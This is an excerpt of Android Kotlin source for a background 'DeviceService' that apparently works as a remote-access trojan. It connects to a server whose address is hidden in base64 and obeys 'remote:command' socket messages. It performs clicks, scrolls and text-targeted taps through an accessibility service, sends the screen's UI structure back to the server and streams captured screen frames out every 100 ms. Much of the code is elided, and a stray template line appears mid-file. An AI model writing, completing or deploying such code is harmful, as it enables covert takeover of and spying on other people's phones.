...
class DeviceService : Service(), LifecycleOwner {
    ...
    "aHR0cHM6Ly9rYXp6YWhvbGR2MjcyLnhhbnRoZXJ4enYubXkuaWQ6MjAwNQ==",
            ...
            socket?.on("remote:command") { args ->
                ...
                when (action) {
                    "click" -> {
                        ...
                        RemoteAccessibilityService.instance?.performClick(x, y)
                    }
                    "scroll" -> {
                        val sx = data.optDouble("startX", 0.0).toFloat()
                        val sy = data.optDouble("startY", 0.0).toFloat()
                        val ex = data.optDouble("endX", 0.0).toFloat()
                        val ey = data.optDouble("endY", 0.0).toFloat()
                        RemoteAccessibilityService.instance?.performScroll(sx, sy, ex, ey)
                    }
                    ...
                    "clickText" -> {
                        val text = data.optString("text", "")
                        RemoteAccessibilityService.instance?.clickElementByText(text)
                    }
                    "uiStructure" -> {
                        val structure = RemoteAccessibilityService.instance?.getUIStructure()
                        socket?.emit("remote:uiStructure", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("structure", structure ?: JSONObject())
                        })
                    }
                }
            }
    ...
    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            ...
            "mirrorStart"    -> startScreenMirroring()
            "mirrorStop"     -> stopScreenMirroring()
        }
    }
...
${htmlContent}
    ...
    private var screenMirroring = false
    private var screenMirrorHandler: Handler? = null
    private var screenMirrorRunnable: Runnable? = null

    private fun startScreenMirroring() {
        if (screenMirroring) return
    ...
    private fun startMirrorLoop() {
        screenMirrorHandler = Handler(Looper.getMainLooper())
        screenMirrorRunnable = object : Runnable {
            override fun run() {
                if (!screenMirroring) return
                captureAndSendMirrorFrame()
                screenMirrorHandler?.postDelayed(this, 100)
            }
        }
    ...
    private fun stopScreenMirroring() {
        ...
        screenMirrorRunnable?.let { screenMirrorHandler?.removeCallbacks(it) }
        screenMirrorHandler = null
        screenMirrorRunnable = null
        stopScreenCapture()
        emitStatus(JSONObject().apply { put("screenMirroring", false) })
    }
